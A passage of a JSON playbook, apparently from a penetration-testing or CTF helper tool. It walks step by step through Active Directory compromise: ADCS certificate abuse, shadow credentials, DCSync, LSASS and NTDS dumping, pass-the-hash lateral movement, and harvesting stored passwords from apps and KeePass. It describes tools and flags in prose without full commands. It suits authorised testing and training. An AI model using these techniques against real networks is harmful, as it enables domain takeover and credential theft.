        "Overlooking an inherited ACE."
      ]
    },
    {
      "when": "Who can reach DA.",
      "land": [
        "The flip side: who is already positioned to seize Domain Admins."
      ],
      "look": [
        "Accounts with paths to DA."
      ],
      "win": "The DA-capable set is mapped.",
      "mistakes": [
        "Only looking outward from your own node."
      ]
    },
    {
      "when": "Where you are local admin.",
      "land": [
        "Hosts where your user already holds local admin, lateral targets needing no escalation."
      ],
      "look": [
        "Admin-to hosts."
      ],
      "win": "Lateral targets identified.",
      "mistakes": [
        "Escalating when you already have local admin somewhere."
      ]
    }
  ],
  "ad-path-manual": [
    {
      "when": "ACL edges.",
      "land": [
        "Who holds WriteDacl, GenericAll or WriteOwner over a high-value object."
      ],
      "look": [
        "The abusable ACL."
      ],
      "win": "An ACL path found.",
      "mistakes": [
        "Overlooking rights over an OU or the domain object itself."
      ]
    },
    {
      "when": "LANE 1 companion: the single highest-value query.",
      "land": [
        "The one nxc query most likely to shortcut the path."
      ],
      "look": [
        "A direct lead."
      ],
      "win": "A shortcut lead.",
      "mistakes": [
        "Running every query when one would do."
      ]
    },
    {
      "when": "Members of the high-value groups.",
      "land": [
        "Domain Admins, Enterprise Admins, Account Operators, Backup Operators."
      ],
      "look": [
        "Group members worth targeting."
      ],
      "win": "High-value members found.",
      "mistakes": [
        "Checking only Domain Admins."
      ]
    },
    {
      "when": "LANE 1 (remote, no foothold): start with nxc.",
      "land": [
        "Enumerate privileged accounts remotely."
      ],
      "look": [
        "adminCount=1 accounts."
      ],
      "win": "Privileged accounts listed.",
      "mistakes": [
        "Forgetting adminCount can be stale after demotion."
      ]
    },
    {
      "when": "Roastable accounts in one pass.",
      "land": [
        "Crackable material is often the shortest way in."
      ],
      "look": [
        "Roastable SPN or AS-REP accounts."
      ],
      "win": "Roast targets found.",
      "mistakes": [
        "Skipping roasting because you have no creds (AS-REP needs none)."
      ]
    },
    {
      "when": "Delegation-trusted accounts.",
      "land": [
        "A delegation edge to a DA-logged host or a service is leverage."
      ],
      "look": [
        "Delegation-trusted accounts."
      ],
      "win": "A delegation edge found.",
      "mistakes": [
        "Confusing unconstrained with constrained delegation."
      ]
    },
    {
      "when": "ADCS.",
      "land": [
        "Enumerate the CAs and templates. An ESC1-16 verdict here is a fast path."
      ],
      "look": [
        "A vulnerable template."
      ],
      "win": "An ADCS path found.",
      "mistakes": [
        "Skipping ADCS because it feels advanced."
      ]
    },
    {
      "when": "Description sweep.",
      "land": [
        "Dump every description. Admins still leave temp or initial passwords there."
      ],
      "look": [
        "A password in a description."
      ],
      "win": "A credential hint.",
      "mistakes": [
        "Not reading the descriptions."
      ]
    },
    {
      "when": "Trusts.",
      "land": [
        "Domain and forest trusts (direction and type). An inbound or bidirectional trust is leverage."
      ],
      "look": [
        "An abusable trust."
      ],
      "win": "A trust path found.",
      "mistakes": [
        "Ignoring trust direction."
      ]
    },
    {
      "when": "Pre-created computer accounts.",
      "land": [
        "Pre-Win2000 computer accounts authenticate with the lowercased machine name as the password."
      ],
      "look": [
        "A pre-created computer account."
      ],
      "win": "A free machine credential.",
      "mistakes": [
        "Overlooking this easy foothold."
      ]
    },
    {
      "when": "Raw LDAP fallback.",
      "land": [
        "When nxc modules are unavailable, this filter finds DONT_REQ_PREAUTH."
      ],
      "look": [
        "Roastable accounts via raw LDAP."
      ],
      "win": "A raw LDAP lead.",
      "mistakes": [
        "Wrong filter syntax."
      ]
    },
    {
      "when": "LANE 2 (PowerView on a foothold): your nested groups.",
      "land": [
        "Every group you belong to through nesting, the effective privileges."
      ],
      "look": [
        "An effective privileged membership."
      ],
      "win": "Nested membership mapped.",
      "mistakes": [
        "Reading only direct membership."
      ]
    },
    {
      "when": "Your ACLs over other objects.",
      "land": [
        "GenericAll, WriteDacl, WriteOwner or ForceChangePassword you hold."
      ],
      "look": [
        "An abusable right."
      ],
      "win": "An ACL you can abuse.",
      "mistakes": [
        "Missing ForceChangePassword on a privileged user."
      ]
    },
    {
      "when": "Who holds DCSync.",
      "land": [
        "DS-Replication rights on the domain."
      ],
      "look": [
        "DCSync holders."
      ],
      "win": "The DCSync set found.",
      "mistakes": [
        "Not checking if you can grant yourself the right."
      ]
    },
    {
      "when": "Delegation from the foothold.",
      "land": [
        "Unconstrained-delegation computers capture any auth to them."
      ],
      "look": [
        "A delegation target."
      ],
      "win": "A delegation edge from on-host.",
      "mistakes": [
        "Not coercing a privileged auth to the delegation host."
      ]
    },
    {
      "when": "LANE 3 (built-in, nothing to upload): your privileges.",
      "land": [
        "Group memberships plus privileges (SeImpersonate and friends)."
      ],
      "look": [
        "A dangerous privilege."
      ],
      "win": "A built-in path lead.",
      "mistakes": [
        "Uploading tools when whoami /all already answers."
      ]
    },
    {
      "when": "Targeting a Windows Server 2025 domain controller where your account may have CreateChild or Write rights on an Organizational Unit.",
      "land": [
        "Run NetExec LDAP with -M badsuccessor to check whether any non-admin principal can create a delegated Managed Service Account (dMSA) in a writable OU."
      ],
      "look": [
        "BADSUCCESSOR output naming principals and writable OUs vulnerable to dMSA privilege escalation."
      ],
      "win": "Writable OU identified for Windows Server 2025 dMSA (BadSuccessor) impersonation of privileged accounts.",
      "mistakes": [
        "Overlooking dMSA creation rights on OUs when standard BloodHound or DACL checks show no direct Domain Admins path."
      ]
    }
  ],
  "dump-secrets": [
    {
      "when": "Local SAM plus LSA secrets in one shot.",
      "land": [
        "Service passwords and cached creds come with the SAM hashes."
      ],
      "look": [
        "Local hashes and LSA secrets."
      ],
      "win": "SAM and LSA dumped.",
      "mistakes": [
        "Running without local admin."
      ]
    },
    {
      "when": "ON A DC: the whole domain via DRSUAPI.",
      "land": [
        "Every hash, krbtgt included, one line, nothing touches disk."
      ],
      "look": [
        "The full NTDS, krbtgt NT hash included."
      ],
      "win": "The domain is dumped.",
      "mistakes": [
        "Running it without DA or DCSync rights."
      ]
    },
    {
      "when": "Remote LSASS dump.",
      "land": [
        "The preferred alternative to getting on the box with mimikatz."
      ],
      "look": [
        "Logged-on creds."
      ],
      "win": "LSASS dumped remotely.",
      "mistakes": [
        "Expecting it without admin on the target."
      ]
    },
    {
      "when": "SeBackup or Backup Operators path.",
      "land": [
        "With that right (no full admin needed) nxc can grab the hives."
      ],
      "look": [
        "SAM and SYSTEM via the backup privilege."
      ],
      "win": "Hives via SeBackup.",
      "mistakes": [
        "Thinking you need full admin."
      ]
    },
    {
      "when": "Winlogon autologon secrets.",
      "land": [
        "DefaultUserName and DefaultPassword from the registry."
      ],
      "look": [
        "A cleartext autologon password."
      ],
      "win": "An autologon secret.",
      "mistakes": [
        "Overlooking the registry autologon keys."
      ]
    },
    {
      "when": "On-host fallback (mimikatz).",
      "land": [
        "Needs an interactive elevated session. Always elevate first."
      ],
      "look": [
        "Hashes and plaintext."
      ],
      "win": "An on-host dump.",
      "mistakes": [
        "Not elevating before running it."
      ]
    },
    {
      "when": "From LSASS memory (logonpasswords).",
      "land": [
        "Plaintext and hashes for currently logged-on sessions."
      ],
      "look": [
        "Plaintext for current users."
      ],
      "win": "LSASS creds.",
      "mistakes": [
        "Missing it because the user logged off."
      ]
    },
    {
      "when": "Remote SAM, LSA and cached dump.",
      "land": [
        "Needs local admin on the target."
      ],
      "look": [
        "Cached domain creds."
      ],
      "win": "A remote dump.",
      "mistakes": [
        "Running without the admin rights it needs."
      ]
    },
    {
      "when": "Offline parse of exfiltrated hives.",
      "land": [
        "For when you exfiltrated the registry hives instead."
      ],
      "look": [
        "Hashes from the hives."
      ],
      "win": "An offline hive parse.",
      "mistakes": [
        "Missing the SYSTEM hive for the bootkey."
      ]
    },
    {
      "when": "One account from NTDS.",
      "land": [
        "Extract a single account instead of the entire database."
      ],
      "look": [
        "One target hash."
      ],
      "win": "A targeted NTDS extract.",
      "mistakes": [
        "Dumping the whole DB when one account would do."
      ]
    },
    {
      "when": "On a DC where you belong to Backup Operators or hold SeBackupPrivilege and need an on-host VSS snapshot of ntds.dit.",
      "land": [
        "Runs diskshadow with a script that creates a Volume Shadow Copy of C: so you can copy ntds.dit and the SYSTEM hive without locking errors."
      ],
      "look": [
        "Shadow copy creation success and an exposed drive letter containing Windows\\NTDS\\ntds.dit."
      ],
      "win": "diskshadow exposes a readable VSS copy of ntds.dit.",
      "mistakes": [
        "Running diskshadow from a non-elevated shell or using CRLF/encoding errors in the script file."
      ]
    },
    {
      "when": "On a host running Azure AD Connect (Entra Connect) with an ADSync database.",
      "land": [
        "Decrypts the high-privilege MSOL_ synchronization account credentials stored in the local ADSync database."
      ],
      "look": [
        "Cleartext domain and MSOL_ account username and password."
      ],
      "win": "The Azure AD Connect MSOL_ synchronization credential is recovered in cleartext.",
      "mistakes": [
        "Overlooking Azure AD Connect on member servers, which often holds replication/DCSync rights in AD."
      ]
    }
  ],
  "dcsync": [
    {
      "when": "Cash in DCSync from Kali (preferred).",
      "land": [
        "DRSUAPI replication with the least typing."
      ],
      "look": [
        "Every hash, krbtgt included."
      ],
      "win": "DCSync returns the hashes.",
      "mistakes": [
        "Lacking the replication rights."
      ]
    },
    {
      "when": "A robust fallback.",
      "land": [
        "For when nxc stalls on its prompt or hits DRSR BAD_DN, a full impacket secretsdump."
      ],
      "look": [
        "The full dump."
      ],
      "win": "The fallback dumps the domain.",
      "mistakes": [
        "Giving up on the first tool error."
      ]
    },
    {
      "when": "One account, quieter.",
      "land": [
        "Replicate just one account when you only need the target."
      ],
      "look": [
        "One hash (for example Administrator)."
      ],
      "win": "A quiet single-account sync.",
      "mistakes": [
        "Syncing the whole domain noisily when one account suffices."
      ]
    },
    {
      "when": "Kerberos ticket-authenticated DCSync (-k -no-pass).",
      "land": [
        "Export KRB5CCNAME to your forged or delegated ccache and target the DC by FQDN with -dc-ip."
      ],
      "look": [
        "DRSUAPI replication dumping NTDS hashes over Kerberos without a password or NT hash."
      ],
      "win": "Full NTDS replication via Kerberos ccache ticket.",
      "mistakes": [
        "Passing a raw IP address in the principal target instead of the DC FQDN required for Kerberos SPN matching."
      ]
    },
    {
      "when": "On-host last resort.",
      "land": [
        "A Windows session as the rights-holder replicates via mimikatz."
      ],
      "look": [
        "The target hash on-host."
      ],
      "win": "On-host DCSync.",
      "mistakes": [
        "Running as the wrong identity."
      ]
    }
  ],
  "own-domain-pth": [
    {
      "when": "You dumped the domain Administrator NT hash.",
      "land": [
        "Confirm it authenticates. Expect (Pwn3d!)."
      ],
      "look": [
        "A Pwn3d! on the DC."
      ],
      "win": "The Administrator hash validates.",
      "mistakes": [
        "Pasting the whole LM:NT. Use the NT half."
      ]
    },
    {
      "when": "Right after confirming (Pwn3d!), to verify command execution as Administrator over SMB without opening a full shell.",
      "land": [
        "Executes a one-liner over SMB using the dumped Administrator NT hash."
      ],
      "look": [
        "nt authority\\system or domain\\administrator in the command output."
      ],
      "win": "Remote command execution as Administrator is confirmed over SMB.",
      "mistakes": []
    },
    {
      "when": "A SYSTEM shell when WinRM is closed.",
      "land": [
        "psexec pass-the-hash with -hashes \":NT\" (empty LM half)."
      ],
      "look": [
        "A SYSTEM shell."
      ],
      "win": "SYSTEM via PtH.",
      "mistakes": [
        "Forgetting the empty LM half in the hash string."
      ]
    },
    {
      "when": "An interactive shell as Administrator over WinRM.",
      "land": [
        "Pure pass-the-hash, no plaintext."
      ],
      "look": [
        "An Evil-WinRM prompt as Administrator."
      ],
      "win": "An admin shell via PtH.",
      "mistakes": [
        "Trying WinRM where it is not listening.",
        "Evil-WinRM dies with `NameError: uninitialized constant Net::NTLM::Client::SessionCrypto::CLIENT_TO_SERVER_SEALING` right after it connects: that is the `rubyntlm` 0.6.7 bug on a fresh Kali, not your hash. Auth actually succeeded; the first sealed message is what throws. Fix it with `sudo gem install rubyntlm` (pulls 0.6.8, which carries the patch), then re-run. The Loadout script does this for you."
      ]
    }
  ],
  "validate-credential": [
    {
      "when": "You hold recovered credential material that has not been validated on this target and service, including an offline-cracked password.",
      "land": [
        "Run the switchless nxc check: proto, target, user, secret, nothing else."
      ],
      "look": [
        "A green [+] line (it works) versus a red [-] STATUS_LOGON_FAILURE (it does not), and (Pwn3d!) if the account is a local admin."
      ],
      "win": "You know the credential authenticates before you spend a single move on it.",
      "mistakes": [
        "Building a whole attack on a credential you never confirmed, then blaming the exploit when it was the password all along.",
        "Treating offline recovery or a login on another host or service as proof here. A result applies to the exact credential, target, and service; a changed secret requires its own evidence."
      ]
    },
    {
      "when": "You found an NT hash rather than a plaintext password.",
      "land": [
        "Same check with -H instead of -p: pass-the-hash to prove the hash authenticates."
      ],
      "look": [
        "A [+] line means the hash works; you never needed to crack it."
      ],
      "win": "The found hash is confirmed usable for pass-the-hash.",
      "mistakes": [
        "Burning hours cracking a hash you could have just passed."
      ]
    },
    {
      "when": "The credential checks out on SMB and you want the directory surface.",
      "land": [
        "Repeat over ldap, the bind you need for BloodHound collection and directory reads."
      ],
      "look": [
        "A [+] on ldap means you can authenticate directory queries even when SMB is clamped down."
      ],
      "win": "You know the credential opens LDAP, not just SMB.",
      "mistakes": [
        "Assuming SMB access implies LDAP access, confirm each protocol you intend to use."
      ]
    },
    {
      "when": "You want to know if this credential is a shell, not just a read.",
      "land": [
        "Check winrm: a [+] here means evil-winrm is one command away, your fastest foothold."
      ],
      "look": [
        "A green [+] on winrm, versus nothing if 5985 is closed or the account is not in Remote Management Users."
      ],
      "win": "You know whether the credential hands you an interactive shell.",
      "mistakes": [
        "Stopping at the first SMB [+] and missing that the same credential also opens a WinRM shell."
      ]
    },
    {
      "when": "Domain authentication returned STATUS_LOGON_FAILURE on a domain-joined Windows member server.",
      "land": [
        "Retry the switchless SMB check with --local-auth to test the local SAM database instead of the domain controller."
      ],
      "look": [
        "A green [+] against the host's local computer name (and (Pwn3d!) if the local account has administrative rights)."
      ],
      "win": "A credential recovered from an application or config authenticates as a local SAM account even though no matching domain account accepted it.",
      "mistakes": [
        "Running --local-auth against a Domain Controller (DCs have no separate local SAM accounts)."
      ]
    },
    {
      "when": "Port 22 is open on the target and you hold a recovered plaintext password.",
      "land": [
        "Run nxc ssh to confirm whether the password authenticates over SSH before launching an interactive session."
      ],
      "look": [
        "A green [+] SSH line confirming password authentication succeeded."
      ],
      "win": "SSH password reuse is confirmed, making ssh user@target an immediate interactive shell.",
      "mistakes": [
        "Testing only Windows protocols when an open SSH daemon on Linux or Windows OpenSSH accepts the same password."
      ]
    }
  ],
  "lateral-exec": [
    {
      "when": "Start by validating the credential and seeing what it owns.",
      "land": [
        "Point it at the subnet to find where you are admin."
      ],
      "look": [
        "Pwn3d! on reachable hosts."
      ],
      "win": "You learn where the credential is admin.",
      "mistakes": [
        "Picking a host before knowing where you are admin."
      ]
    },
    {
      "when": "Run a single command remotely over SMB once your credential shows (Pwn3d!).",
      "land": [
        "Executes cmd.exe /c over SMB and returns the output directly in your terminal."
      ],
      "look": [
        "Command output printed beneath the SMB host line."
      ],
      "win": "A remote command runs over SMB.",
      "mistakes": [
        "Running -x without local Administrator rights on the target."
      ]
    },
    {
      "when": "A WMI exec fallback (DCOM/135).",
      "land": [
        "For when SMB (445) and WinRM (5985) are filtered but RPC is open."
      ],
      "look": [
        "Command output over DCOM."
      ],
      "win": "Execution via DCOM.",
      "mistakes": [
        "Assuming no path when 445 and 5985 are closed."
      ]
    },
    {
      "when": "Inject Meterpreter over SMB.",
      "land": [
        "Needs admin. A staged in-memory shell."
      ],
      "look": [
        "A meterpreter session."
      ],
      "win": "An in-memory shell.",
      "mistakes": [
        "Dropping a binary when in-memory avoids disk."
      ]
    },
    {
      "when": "The WinRM version (no SMB artifacts).",
      "land": [
        "Output over 5985. Caveat: some nxc builds buffer it."
      ],
      "look": [
        "Command output over WinRM."
      ],
      "win": "Execution via WinRM.",
      "mistakes": [
        "Assuming it failed when output is just buffered."
      ]
    },
    {
      "when": "Native PSRemoting.",
      "land": [
        "Build a PSCredential and Invoke-Command."
      ],
      "look": [
        "Remote command output."
      ],
      "win": "PSRemoting works.",
      "mistakes": [
        "Not building the PSCredential correctly."
      ]
    },
    {
      "when": "Sysinternals PsExec from Windows.",
      "land": [
        "Inherits your current logon or an injected hash."
      ],
      "look": [
        "A SYSTEM shell."
      ],
      "win": "A PsExec session.",
      "mistakes": [
        "Running it where EDR flags the service."
      ]
    },
    {
      "when": "Evil-WinRM (the nicest interactive session).",
      "land": [
        "When 5985 or 5986 is listening. -H to pass the hash."
      ],
      "look": [
        "An interactive PS prompt."
      ],
      "win": "A clean interactive shell.",
      "mistakes": [
        "Using -p with a hash instead of -H."
      ]
    },
    {
      "when": "impacket psexec (a service SYSTEM shell).",
      "land": [
        "Noisy but dependable."
      ],
      "look": [
        "A SYSTEM shell."
      ],
      "win": "A service-based SYSTEM shell.",
      "mistakes": [
        "Using it when stealth matters. Prefer wmiexec."
      ]
    },
    {
      "when": "The pass-the-hash form.",
      "land": [
        "No plaintext required."
      ],
      "look": [
        "A shell via the hash."
      ],
      "win": "PtH execution.",
      "mistakes": [
        "Pasting the LM half when only NT is needed."
      ]
    },
    {
      "when": "Kerberos ticket-authenticated execution (-k -no-pass).",
      "land": [
        "Set KRB5CCNAME to your ccache ticket and specify the target host FQDN with -dc-ip."
      ],
      "look": [
        "A SYSTEM shell over SMB using the Kerberos ticket without plaintext or NTLM hash."
      ],
      "win": "Kerberos ticket lateral execution.",
      "mistakes": [
        "Targeting an IP literal instead of the host FQDN when authenticating via Kerberos."
      ]
    },
    {
      "when": "Stealthier (no service).",
      "land": [
        "smbexec and atexec create no service."
      ],
      "look": [
        "Command output, quieter."
      ],
      "win": "A quieter exec.",
      "mistakes": [
        "Choosing the loud option when a quiet one exists."
      ]
    }
  ],
  "remote-app-creds": [
    {
      "when": "Harvest stored app creds: mRemoteNG.",
      "land": [
        "confCons.xml passwords are reversibly encrypted. nxc decrypts them."
      ],
      "look": [
        "Decrypted connection passwords."
      ],
      "win": "mRemoteNG creds recovered.",
      "mistakes": [
        "Overlooking confCons.xml in the profile."
      ]
    },
    {
      "when": "WinSCP.",
      "land": [
        "Saved-session creds from the registry or INI."
      ],
      "look": [
        "WinSCP passwords."
      ],
      "win": "WinSCP creds recovered.",
      "mistakes": [
        "Treating the obfuscated value as cleartext."
      ]
    },
    {
      "when": "PuTTY.",
      "land": [
        "Stored session creds and keys from the registry."
      ],
      "look": [
        "PuTTY secrets."
      ],
      "win": "PuTTY creds recovered.",
      "mistakes": [
        "Missing the proxy-password field."
      ]
    },
    {
      "when": "RDCMan.",
      "land": [
        "RDCMan.settings holds saved RDP creds, decrypted under the user."
      ],
      "look": [
        "Saved RDP creds."
      ],
      "win": "RDCMan creds recovered.",
      "mistakes": [
        "Decrypting as the wrong user."
      ]
    },
    {
      "when": "IIS web.config.",
      "land": [
        "App-pool and connection-string creds (service accounts, DB)."
      ],
      "look": [
        "A DB or service-account credential."
      ],
      "win": "IIS creds recovered.",
      "mistakes": [
        "Skipping the applicationHost.config."
      ]
    },
    {
      "when": "Firefox logins.",
      "land": [
        "Decrypt logins.json plus key4.db from the profiles."
      ],
      "look": [
        "Saved browser logins."
      ],
      "win": "Firefox creds recovered.",
      "mistakes": [
        "Copying logins.json without key4.db."
      ]
    },
    {
      "when": "PowerShell history.",
      "land": [
        "ConsoleHost_history.txt. Operators routinely paste passwords there."
      ],
      "look": [
        "A password in command history."
      ],
      "win": "A credential from history.",
      "mistakes": [
        "Not checking every user profile."
      ]
    },
    {
      "when": "Veeam.",
      "land": [
        "Veeam stores credentials (often domain admin) in its config DB."
      ],
      "look": [
        "A domain-admin credential."
      ],
      "win": "A Veeam credential, often DA.",
      "mistakes": [
        "Overlooking a backup server as a credential goldmine."
      ]
    },
    {
      "when": "KeePass, step 1.",
      "land": [
        "Locate a .kdbx and the running KeePass process, then arm the trigger module."
      ],
      "look": [
        "A .kdbx and a running KeePass."
      ],
      "win": "The KeePass trigger is armed.",
      "mistakes": [
        "Arming it with no running KeePass to catch."
      ]
    },
    {
      "when": "KeePass, step 2.",
      "land": [
        "This needs the user to unlock KeePass afterwards. The trigger then writes the cleartext."
      ],
      "look": [
        "Exported cleartext entries."
      ],
      "win": "KeePass entries exfiltrated.",
      "mistakes": [
        "Expecting it before the user unlocks the database."
      ]
    }
  ],
  "nxc-arsenal": [
    {
      "when": "Spray or validate one password across many.",
      "land": [
        "Add --continue-on-success to keep going past the first hit."
      ],
      "look": [
        "A [+] on a hit."
      ],
      "win": "A validated or sprayed credential.",
      "mistakes": [
        "Spraying without lockout awareness."
      ]
    },
    {
      "when": "An authenticated pull of users, groups and shares.",
      "land": [
        "All at once with one command."
      ],
      "look": [
        "Users, groups and share permissions."
      ],
      "win": "A broad authenticated pull.",
      "mistakes": [
        "Running separate commands for each."
      ]
    },
    {
      "when": "A share spider to JSON.",
      "land": [
        "Inventory every readable file, then grep the output."
      ],
      "look": [
        "Credential-bearing files."
      ],
      "win": "A share inventory.",
      "mistakes": [
        "Not grepping the JSON for secrets."
      ]
    },
    {
      "when": "AS-REP roast via nxc.",
      "land": [
        "No impacket required."
      ],
      "look": [
        "Roasted hashes."
      ],
      "win": "A roast via nxc.",
      "mistakes": [
        "Installing impacket when nxc already does it."
      ]
    },
    {
      "when": "Kerberoast via nxc.",
      "land": [
        "SPN roast through nxc."
      ],
      "look": [
        "TGS hashes."
      ],
      "win": "Kerberoast via nxc.",
      "mistakes": [
        "Overlooking that nxc can roast too."
      ]
    },
    {
      "when": "Pass-the-hash validation across the subnet.",
      "land": [
        "Find where the hash is accepted."
      ],
      "look": [
        "Pwn3d! hosts."
      ],
      "win": "Where the hash works.",
      "mistakes": [
        "Testing one host instead of the subnet."
      ]
    },
    {
      "when": "Dump the local SAM on an owned box.",
      "land": [
        "--lsa for LSA secrets, --ntds on a DC."
      ],
      "look": [
        "Local hashes."
      ],
      "win": "A local dump via nxc.",
      "mistakes": [
        "Using --ntds off a DC."
      ]
    },
    {
      "when": "An execution check over WinRM.",
      "land": [
        "Proves shell-level access without opening a full session."
      ],
      "look": [
        "Command output."
      ],
      "win": "WinRM exec confirmed.",
      "mistakes": [
        "Opening a full session just to test access."
      ]
    }
  ],
  "cred-reuse-sweep": [
    {
      "when": "Spray a validated credential across the subnet.",
      "land": [
        "Find every host where it is admin."
      ],
      "look": [
        "Pwn3d! across hosts."
      ],
      "win": "The reuse footprint is mapped.",
      "mistakes": [
        "Testing one host and assuming the rest."
      ]
    },
    {
      "when": "The pass-the-hash form.",
      "land": [
        "Sweep with just the NTLM hash, no plaintext. Ideal straight after a dump."
      ],
      "look": [
        "Pwn3d! via the hash."
      ],
      "win": "PtH reuse mapped.",
      "mistakes": [
        "Cracking the hash when a sweep needs only the hash."
      ]
    },
    {
      "when": "When the credential is a LOCAL account.",
      "land": [
        "Use --local-auth for a dumped local Administrator hash."
      ],
      "look": [
        "Local-admin reuse across hosts."
      ],
      "win": "Local-account reuse mapped.",
      "mistakes": [
        "Forgetting --local-auth for a local account."
      ]
    }
  ],
  "adcs-esc": [
    {
      "when": "Hunt ADCS misconfigurations.",
      "land": [
        "List templates and CAs. -vulnerable narrows it to exploitable setups."
      ],
      "look": [
        "An ESC1-16 verdict and the vulnerable template name."
      ],
      "win": "A vulnerable template is found.",
      "mistakes": [
        "Not noting the CA and template names for the next step."
      ]
    },
    {
      "when": "ESC1: request a certificate as Administrator.",
      "land": [
        "You need the CA and template names from the scan."
      ],
      "look": [
        "A .pfx issued in the target identity."
      ],
      "win": "A cert for Administrator is issued.",
      "mistakes": [
        "Wrong template or CA name."
      ]
    },
    {
      "when": "Authenticate with the certificate.",
      "land": [
        "It hands back a TGT and the NTLM hash."
      ],
      "look": [
        "A TGT and the account NT hash."
      ],
      "win": "The cert yields auth material.",
      "mistakes": [
        "Discarding the NT hash it returns."
      ]
    },
    {
      "when": "ESC8: relay coerced DC$ auth.",
      "land": [
        "Relay coerced auth (see coerce-auth) to the CA web-enrollment endpoint."
      ],
      "look": [
        "A DC certificate."
      ],
      "win": "ESC8 yields a DC cert.",
      "mistakes": [
        "No coercion feeding the relay."
      ]
    },
    {
      "when": "ESC9/10: write over a victim.",
      "land": [
        "With no SID-extension enforcement, set the victim UPN and enroll as them."
      ],
      "look": [
        "A cert impersonating the victim."
      ],
      "win": "ESC9/10 impersonation.",
      "mistakes": [
        "Not restoring the victim UPN afterward."
      ]
    },
    {
      "when": "ESC7: add yourself as an Officer with ManageCA rights.",
      "land": [
        "certipy ca -add-officer to grant your user Manage Certificates rights on the CA."
      ],
      "look": [
        "Successfully added officer message from certipy."
      ],
      "win": "Officer rights granted on CA.",
      "mistakes": [
        "Not holding ManageCA permissions initially."
      ]
    },
    {
      "when": "ESC7: enable the SubCA template.",
      "land": [
        "certipy ca -enable-template SubCA to ensure the CA processes requests."
      ],
      "look": [
        "Confirmation that the SubCA template is enabled."
      ],
      "win": "SubCA template enabled.",
      "mistakes": [
        "Target CA does not permit enabling templates."
      ]
    },
    {
      "when": "ESC7: request a certificate as Administrator using SubCA.",
      "land": [
        "certipy req with -template SubCA -upn administrator. The initial request is denied or pending."
      ],
      "look": [
        "A Request ID returned by the CA."
      ],
      "win": "Request ID obtained for issuance.",
      "mistakes": [
        "Missing the Request ID for the next command."
      ]
    },
    {
      "when": "ESC7: issue the pending certificate request.",
      "land": [
        "certipy ca -issue-request with your Request ID using your officer rights."
      ],
      "look": [
        "Confirmation that the request was successfully issued."
      ],
      "win": "Certificate request issued by officer.",
      "mistakes": [
        "Using the wrong Request ID."
      ]
    },
    {
      "when": "ESC7: retrieve the issued Administrator certificate.",
      "land": [
        "certipy req -retrieve with your Request ID to download the certificate as a .pfx file."
      ],
      "look": [
        "A saved administrator.pfx file."
      ],
      "win": "Administrator PFX retrieved for PKINIT authentication.",
      "mistakes": [
        "Attempting retrieval before the request has been issued."
      ]
    },
    {
      "when": "ESC4: modify a vulnerable certificate template.",
      "land": [
        "certipy template with -save-old to backup original config and enable client auth and enrollee SAN."
      ],
      "look": [
        "Template modified successfully message and backup JSON written."
      ],
      "win": "Template altered to an ESC1 vulnerable state.",
      "mistakes": [
        "Forgetting -save-old, preventing clean restoration later."
      ]
    },
    {
      "when": "ESC4: request a certificate using the altered template.",
      "land": [
        "certipy req with -template and -upn administrator to obtain the certificate."
      ],
      "look": [
        "An administrator.pfx certificate file."
      ],
      "win": "Administrator certificate acquired.",
      "mistakes": [
        "Requesting before template modification took effect."
      ]
    },
    {
      "when": "ESC4: restore the original template configuration.",
      "land": [
        "certipy template with -configuration using the saved JSON backup."
      ],
      "look": [
        "Template restored successfully message."
      ],
      "win": "Template restored to original state, avoiding detection and service disruption.",
      "mistakes": [
        "Leaving the template vulnerable and breaking CA operations."
      ]
    },
    {
      "when": "ESC3: enrollment agent abuse via on-behalf-of certificate request.",
      "land": [
        "Request an Enrollment Agent certificate, then use its .pfx with -on-behalf-of to request a User certificate for Administrator."
      ],
      "look": [
        "A newly issued administrator.pfx obtained via enrollment agent delegation."
      ],
      "win": "Administrator certificate issued through ESC3 enrollment agent rights.",
      "mistakes": [
        "Missing Certificate Request Agent rights on the initial template or lacking permission on the target User template."
      ]
    },
    {
      "when": "ESC4: overwrite template ACLs to a default ESC1-vulnerable configuration.",
      "land": [
        "certipy template with -save-old and -write-default-configuration to rewrite the template to standard ESC1 settings."
      ],
      "look": [
        "Template configuration saved to backup and default vulnerable configuration written."
      ],
      "win": "Template converted to vulnerable default ESC1 configuration with backup preserved.",
      "mistakes": [
        "Not preserving the backup file needed to revert changes after compromise."
      ]
    },
    {
      "when": "You hold any valid domain credential and want a fast LDAP check for Active Directory Certificate Services CAs and enrollment endpoints.",
      "land": [
        "Run NetExec LDAP with -M adcs to list enterprise CAs, DNS hostnames, web enrollment URLs, and published templates."
      ],
      "look": [
        "ADCS module lines naming the CA server, CA name, and enabled certificate templates."
      ],
      "win": "Enterprise CA name and host discovered over LDAP, ready for certipy find -vulnerable.",
      "mistakes": [
        "Assuming no CA exists in the forest without querying the Configuration naming context via -M adcs or certipy."
      ]
    }
  ],
  "cert-authenticate": [
    {
      "when": "Turn a .pfx into a TGT (PKINIT).",
      "land": [
        "Returns a TGT to a .ccache and the NT hash."
      ],
      "look": [
        "A TGT and the NT hash."
      ],
      "win": "The cert authenticates.",
      "mistakes": [
        "Ignoring the NT hash, which enables pass-the-hash."
      ]
    },
    {
      "when": "When the PFX UPN is unclear.",
      "land": [
        "Specify the principal and domain explicitly."
      ],
      "look": [
        "A TGT for the named principal."
      ],
      "win": "Auth with the explicit principal.",
      "mistakes": [
        "Guessing the UPN."
      ]
    },
    {
      "when": "The Windows-side option.",
      "land": [
        "Request and inject the TGT directly from the certificate (Rubeus)."
      ],
      "look": [
        "A TGT in your session."
      ],
      "win": "On-host cert auth.",
      "mistakes": [
        "Not injecting the ticket after requesting it."
      ]
    }
  ],
  "shadow-credentials": [
    {
      "when": "You can write msDS-KeyCredentialLink on a victim.",
      "land": [
        "List the existing key credentials first to confirm your write access."
      ],
      "look": [
        "The current key credentials."
      ],
      "win": "Write access confirmed.",
      "mistakes": [
        "Assuming write access without checking."
      ]
    },
    {
      "when": "Write your key and authenticate.",
      "land": [
        "Write your key, then PKINIT with the resulting PFX (certipy or Rubeus)."
      ],
      "look": [
        "A TGT and NT hash for the victim."
      ],
      "win": "Shadow creds yield auth.",
      "mistakes": [
        "Forgetting to clean up the key you added."
      ]
    },
    {
      "when": "From an on-host Windows foothold when you hold GenericWrite / WriteProperty on a target's msDS-KeyCredentialLink.",
      "land": [
        "Whisker writes a new device key credential to the target object and prints the exact Rubeus asktgt command to run next."
      ],
      "look": [
        "The base64 certificate blob and the Rubeus asktgt /certificate:... command."
      ],
      "win": "Whisker plants the key credential and outputs the Rubeus PKINIT command.",
      "mistakes": [
        "Targeting a DC that lacks a PKINIT-capable DC certificate (Shadow Credentials requires AD CS or DC certificates supporting PKINIT)."
      ]
    },
